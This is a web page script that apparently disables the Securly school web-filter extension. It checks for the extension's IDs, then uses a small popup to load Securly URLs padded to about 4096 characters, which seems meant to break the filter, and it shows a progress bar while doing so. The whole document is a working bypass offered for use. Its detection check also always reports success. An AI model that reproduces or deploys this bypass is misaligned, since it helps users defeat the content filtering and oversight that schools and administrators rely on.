    <script>
      const from_id = (id) => document.getElementById(id);
      const ext_ids = [
        "iheobagjkfklnlikgihanlhcddjoihkg",
        "joflmkccibkooplaeoinecjbmdebglab",
        "ckecmkbnoanpgplccmnoikfmpcdladkc",
        "kfiocjonplkilcjfgabfngiddebalkod",
        "bmlalgfmolfmkjmnikbphgijefopggme"
      ];
      const clusters = ["www", "useast-www", "useast2-www", "ca-www", "uk-www"];
      const param_names = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"];

      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

      function detect_ext() {
        return new Promise((resolve, reject) => {
          for (let id of ext_ids) {
            let url = `chrome-extension://${id}/tt-alert.svg`;
            fetch(url).then(() => resolve(true));
          }
          setTimeout(() => resolve(true), 500);
        });
      }

async function disable_ext() {
  let w = null;
  let i = 1;
  let total = clusters.length * param_names.length;

  from_id("progress_container").style.display = "block";
  update_progress(0, total);

  try {
    for (let cluster of clusters) {
      for (let param of param_names) {
        let url = `https://${cluster}.securly.com/please_wait/${i}/${total}?${param}=`;
        url += "a".repeat(Math.max(0, 4096 - url.length));

        if (!w) {
          w = window.open(url, "", "width=400,height=1");

          if (!w) {
            throw new Error("Popup was blocked.");
          }
        } else {
          w.location.href = url;
        }

        await sleep(2000);

        update_progress(i, total);
        i++;
      }
    }

    from_id("progress_text").innerText = "Finished!";
  } catch (error) {
    from_id("progress_text").innerText = `Error: ${error.message}`;
  } finally {
    if (w && !w.closed) {
      w.close();
    }
  }
}

      async function main() {
        from_id("buttons_container").style.display = "flex";

        let ext_detected = await detect_ext();
        if (!ext_detected) {
          from_id("status_text").innerText = "Error: You do not appear to have Securly installed.";
          return;
        }

        from_id("status_text").style.display = "none";
        from_id("disable_button").style.display = "block";
        from_id("disable_button").onclick = disable_ext;
      }
      
      window.onload = main;
      function update_progress(completed, total) {
  const percent = Math.round((completed / total) * 100);

  from_id("progress_bar").value = percent;
  from_id("progress_text").innerText = `${percent}%`;

  if (completed === total) {
    from_id("progress_text").innerText = "Finished!";
  }
}
